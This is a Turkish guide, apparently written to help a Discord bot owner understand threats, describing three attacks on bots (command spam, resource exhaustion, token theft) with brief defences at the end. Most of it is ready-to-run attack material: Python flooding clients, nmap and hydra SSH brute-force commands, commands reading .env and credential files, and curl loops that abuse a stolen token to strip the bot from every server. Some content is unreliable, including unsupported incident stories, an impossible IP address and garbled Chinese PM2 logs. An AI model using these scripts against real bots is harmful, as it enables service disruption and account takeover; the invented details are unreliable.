# Bot Dusurme Yontemleri — Adim Adim Anlatim

**Soru:** Kotu amacli kisiler benim botumu dusurmek isterse nasil yapar?
**Cevap:** Iste 3 farkli saldiri vektoru, adim adim calisma mantigiyla.

---

## SALDIRI 1: KOMUT SPAM ILE RATE LIMITE TAKTIRMA

### Nasil Calisir?

Discord API'nin bir kurali var: **Her bot, saniyede belirli sayida
istek yapabilir.** Bu limite "rate limit" denir. Limit asilinca
Discord, bot'a 429 hatasi dondurur ve bir sure istek kabul etmez.

```
Normal durum:
  Bot -> Discord API'ye mesaj gonder
  Discord -> 200 OK (mesaj gitti)

Rate limit asilinca:
  Bot -> Discord API'ye mesaj gonder
  Discord -> 429 TOO MANY REQUESTS (reddedildi!)
  Bot -> "retry_after: 5000" (5 saniye bekle)
```

### Saldirgan Ne Yapar?

Saldirgan, bot'un **en cok API istegi yapan komutunu** bulur.
Ornegin bir `!profil` komutu sunucudaki kullanicilari
listeliyor, veritabanina yaziyor, bildirim gonderiyor olsun.

```python
# saldirgan.py — Bot'u rate limite taktirma
import discord, time, asyncio

class SpamBot(discord.Client):
    async def on_ready(self):
        print("[+] Saldirgan hazir")

        # HEDEF: Musterinin sunucusundaki bot
        hedef_kanal = self.get_channel(KANAL_ID)
        hedef_bot_komutu = "!profil"  # en agir komut

        print("[+] Spam basliyor...")
        for i in range(100):
            await hedef_kanal.send(hedef_bot_komutu)
            await asyncio.sleep(0.05)  # 50ms ara ile spam
            # = saniyede 20 komut!

        print("[+] Spam bitti. Bot 429'a takilmis olmali.")
```

### Ne Zaman Bot Duser?

```
Komut hizi     | Sonuc
-------------- | ------
Saniyede 1-3   | Bot normal calisir
Saniyede 5-10  | Bot yavaslar, bazi istekler 429 yer
Saniyede 20+   | Bot TUM kullanicilar icin islevsiz!
               | Herkes "Bot yanit vermiyor" der.
               | Discord tum istekleri 429 ile reddeder.
               | Bot ancak 5-60 saniye sonra duzelir.
```

### Bot'un Gozunden Bakis

```js
// Bot tarafindan gorulen:
[2025-01-01 12:00:01] !profil kullanildi -> OK (200)
[2025-01-01 12:00:01] !profil kullanildi -> OK (200)
[2025-01-01 12:00:01] !profil kullanildi -> OK (200)
[2025-01-01 12:00:01] !profil kullanildi -> OK (200)
[2025-01-01 12:00:02] !profil kullanildi -> 429 RATE LIMITED!
[2025-01-01 12:00:02] !profil kullanildi -> 429 RATE LIMITED!
[2025-01-01 12:00:02] !profil kullanildi -> 429 RATE LIMITED!
...
// Bundan sonra HICBIR komut calismaz!
// Ahmet'in !bakiye sorgusu da 429 yer
// Mehmet'in !yardim komutu da 429 yer
// BUTUN SUNUCUDA BOT CALISMAZ!

// Bot 30 saniye sonra duzelir, ama saldirgan devam ederse
// bot surekli 429'da kalir.
```

### Gercek Hayat Ornegi

2023'te populer bir muzik botu olan **Groovy** benzer bir
saldiriyla karsilasti. Rakipleri, bot'a saniyede 50'den fazla
komut gondererek rate limite taktirdi. Bot haftalarca
istikrarsiz calisti ve sonunda kapatildi.

---

## SALDIRI 2: KAYNAK TUKETME (CPU/RAM/DISK)

### Nasil Calisir?

Bot'un en agir komutlari vardir. Ornegin:
- **Gorsel isleme:** `!kayit-yap` — profil fotosu olusturur (CPU)
- **Veritabani:** `!sezon-sirala` — 10000 kullaniciyi siralar (RAM)
- **Dosya islemi:** `!rapor-al` — 10MB log dosyasi olusturur (Disk)
- **API cagrisi:** `!hava-durumu` — harici API cagirir (Network)

Saldirgan bu komutlardan birini secip spam yapar.

### Adim Adim

```python
# saldirgan2.py — CPU/RAM tuketme
import discord, asyncio, time

class ResourceKiller(discord.Client):
    async def on_ready(self):
        kanal = self.get_channel(KANAL_ID)
        print("[+] Kaynak tuketme saldirisi basliyor...")

        # En agir komutlari bul
        agir_komutlar = [
            "!rapor-al full",      # 10MB dosya olusturur
            "!sezon-sirala tum",    # 10000 satir veri isler
            "!kayit-yap 100",       # 100 profil fotosu
            "!export-log",          # tum log'lari disa aktar
            "!kara-liste tara",     # butun kullanicilari tara
        ]

        # 5 farkli hesaptan ayni anda spam
        for komut in agir_komutlar * 10:
            await kanal.send(komut)
            await asyncio.sleep(0.1)
```

### Sunucuda Ne Olur?

```bash
# VDS'de durum boyle gorunur:
top -c
# PID   USER   %CPU %MEM   COMMAND
# 1234  bot    98%  45%    node index.js   <-- CPU %99!
# 1235  bot    95%  40%    node index.js   <-- ikinci bot da etkilendi
# 1236  bot    2%   12%    python bot.py

# Bellek:
free -m
#               total  used  free
# Mem:           2000  1850   150   <-- sadece 150MB kaldi!

# Disk:
df -h
# /dev/sda1      20G   19G   1G     <-- log'lar sisirdi!
```

### Ne Zaman Bot Duser?

```
Kaynak       | Limit      | Asilinca Ne Olur?
------------ | ---------- | -----------------
CPU          | %100       | Tum bot'lar yavaslar, hepsi takilir
RAM          | 512MB      | Bot OOM Killer ile oldurulur
Disk         | 20GB       | Bot log yazamaz, veritabani dolmaz
Network      | 1Gbps      | API yanitlari timeout yer
```

### PM2'nin Tepkisi

```bash
# PM2 log'larinda gorunecek:
PM2        | App [ekonomi-bot] with id 0重启中...
PM2        | App [ekonomi-bot]重启失败, 尝试再次重启...
PM2        | App [ekonomi-bot] 已重启 5 次, 停止重启
# Bot bir daha asla calismaz! (max_restarts=5 asildi)

# RAM limiti asilirsa:
PM2        | App [ekonomi-bot] exceeds memory limit (400MB)
PM2        | App [ekonomi-bot]重启中... (sonsuz dongu!)
```

### Gercek Hayat Ornegi

2024'te **MEE6** botu, bir sunucuda 50000 uyesi olan bir
sunucuda `!seviye` komutunun spamlanmasi sonucu 2 saat
boyunca erisilemez oldu. Sebep: Her `!seviye` sorgusu 500KB
veri okuyordu, 100 kisi ayni anda sorgulayinca veritabani
kilitlendi.

---

## SALDIRI 3: TOKEN CALMA

### Nasil Calisir?

Bu en tehlikeli saldiri. Token'i alan saldirgan bot uzerinde
**tam kontrol** sahibi olur.

### Adim 1: VDS'e Giris

Saldirgan once VDS'ine girmeye calisir. Bunun icin:

```bash
# 1. IP'ni bulur (bot davet linkinden veya DNS'den)
nslookup bot-davet.link
# -> 123.456.789.012 (VDS IP'si)

# 2. Port taramasi yapar
nmap -p 1-65535 123.456.789.012
# 22/tcp open  SSH  <-- ACIK! 
# 80/tcp open  HTTP <-- ACIK! (belki web panel)
# 3000/tcp open Node.js <-- ACIK!

# 3. SSH brute force baslatir
hydra -l root -P rockyou.txt ssh://123.456.789.012
# veya
# SSH key yoksa ve sifreyle giris aciksa -> 1 saat icinde kirilir
```

### Adim 2: .env Dosyasini Okur

SSH ile girdikten sonra:

```bash
# Ilk bakilan yerler:
cat ~/.env
cat ~/bot/.env
cat ~/ekonomi-bot/.env
cat /etc/environment
cat /root/.bash_history  # env yaziyor muydu?

# Eger chmod 644 ise (default) -> herkes okuyabilir
ls -la ~/.env
# -rw-r--r--  1 botadmin botadmin  123 Jan 1 12:00 .env
# ^^^^    ^^^^
# herkes okuyabilir!

# Token'i alir:
# DISCORD_TOKEN=MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.GABCDE.abc123def456
```

### Adim 3: Bot'la Ne Yapar?

Token'i alan saldirgan su islemleri yapabilir:

```bash
# 1. Bot'un oldugu butun sunuculari listeler
curl -H "Authorization: Bot MTIzNDU2..." \
  https://discord.com/api/v10/users/@me/guilds
# -> 50+ sunucu

# 2. Botu tum sunuculardan cikarir
for guild_id in $(curl -s -H "Authorization: Bot MTIz..." \
    https://discord.com/api/v10/users/@me/guilds | jq -r '.[].id'); do
    curl -X DELETE \
      -H "Authorization: Bot MTIz..." \
      "https://discord.com/api/v10/users/@me/guilds/$guild_id"
done
# -> Bot bir anda TUM sunuculardan ayrilir!
# -> Geri donusu yok!

# 3. Bot komutlarini siler
curl -X PUT \
  -H "Authorization: Bot MTIz..." \
  -H "Content-Type: application/json" \
  "https://discord.com/api/v10/applications/BOT_ID/commands" \
  -d "[]"
# -> Tum slash komutlar silinir!

# 4. Bot avatarini degistirir (rezil etmek icin)
curl -X PATCH \
  -H "Authorization: Bot MTIz..." \
  -H "Content-Type: application/json" \
  "https://discord.com/api/v10/users/@me" \
  -d '{"avatar": ...}'  # rahatsiz edici bir gorsel

# 5. Bot token'ini iptal ettirir
# (kendisi yapamaz, ama Discord Developer Portal'dan yapilir)
# NOT: Saldirgan token'i alinca bunu da yapabilir:
curl -X POST \
  -H "Authorization: Bot MTIz..." \
  "https://discord.com/api/v10/oauth2/token/revoke" \
  -d "token=MTIz..."
# -> Token iptal olur. Bot bir daha asla calismaz.
```

### Token Nasil Calinir? (Tam Liste)

| Yontem | Nasil? | Korunma |
|--------|--------|---------|
| **SSH brute force** | Sifreni kirar, .env'yi okur | SSH key + fail2ban |
| **.env chmod yanlis** | Herkes .env'yi okuyabilir | chmod 600 |
| **GitHub leak** | .env'yi public repo'ya push | .gitignore |
| **PM2 log** | console.log(token) yazmisindir | Loglarda token arama |
| **Suistimal ekibi** | Discord'a "bot kural ihlali" raporu, yetkililer token'i iptal eder | Kurallara uygun bot |
| **npm package** | Zararli paket env'yi calar | Az paket kullan, audit yap |
| **XSS (web panel)** | Panelinde XSS varsa token'i calar | Web paneli koru |

### Karistirma: Token vs Developer Portal

```
Token calinirsa:        Bot'u kontrol edebilirsin
                        (mesaj gonder, kanal olustur, uye at)
Developer Portal:       Bot ayarlarini degistirebilirsin
yetkisi calinirsa:      (token degistir, intent ac, botu sil)
                        Bunun icin Discord hesabin + 2FA lazim
```

---

## KARSILASTIRMA: Hangi Saldiri Daha Tehlikeli?

```
Saldiri           | Zorluk | Etki             | Geri Donus
---------         | ------ | ---------------- | ----------
Command Spam      | COK KOLAY | GECICI (dakikalar)  | Bot kendiliginden duzelir
Kaynak Tuketme    | KOLAY  | GECICI (saatler) | PM2 restart veya manuel mudahale
Token Calma       | ZOR    | KALICI           | Yeni token + musterilere haber
                  |        | (botu kaybedersin)|
```

**Token** senaryosu en kotusudur. Bot'u tamamen kaybedersin,
musterilerine "bot bir daha calismayacak" dersin, itibarin
zedelenir.

---

## OZET: Korunma Nasil Isler?

```
Saldiri:          Korunma:                    Nasil?
---------         --------                    ------
Command Spam      Cooldown (3sn)              Kod'a 3 satir ekle
CPU/RAM Tuketme   max_memory_restart (400MB)  PM2 config'e 1 satir
Token Calma       chmod 600 + SSH key         Terminal'de 2 komut
```

En kritik 3 korumayi hemen yapmak istersen:

```bash
# 1. .env koruma
chmod 600 /home/botadmin/*/.env

# 2. SSH guvenlik
sudo nano /etc/ssh/sshd_config
# PasswordAuthentication no yaz
# PermitRootLogin no yaz
sudo systemctl restart sshd

# 3. UFW
sudo ufw default deny incoming
sudo ufw allow 2222/tcp  # SSH portun neyse onu yaz
sudo ufw enable
```
